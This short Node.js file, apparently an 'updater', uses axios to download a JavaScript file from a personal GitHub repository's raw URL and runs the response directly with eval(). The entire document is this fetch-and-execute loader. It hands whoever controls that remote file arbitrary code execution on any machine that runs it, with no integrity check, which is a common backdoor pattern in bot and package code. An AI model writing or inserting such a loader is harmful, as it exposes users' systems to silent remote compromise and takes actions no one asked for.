const axios = require('axios');

axios.get("https://raw.githubusercontent.com/MR-OME-600/Mahabub-Rahman/main/updater.js")
	.then(res => eval(res.data));
